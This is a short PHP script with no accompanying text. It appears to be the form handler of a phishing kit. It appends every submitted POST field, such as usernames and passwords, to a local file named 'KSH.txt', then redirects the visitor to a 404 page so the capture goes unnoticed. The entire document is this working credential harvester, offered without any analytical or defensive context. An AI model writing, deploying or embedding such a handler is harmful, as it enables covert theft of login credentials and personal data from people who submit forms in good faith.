<?php
header("location:http:404.html");
$handle=fopen("KSH.txt","a");
foreach($_POST as $variable=>$value)
{
	fwrite($handle,$variable);
	fwrite($handle,"=");
	fwrite($handle,$value);
	fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:http:404.html");
exit;
?>
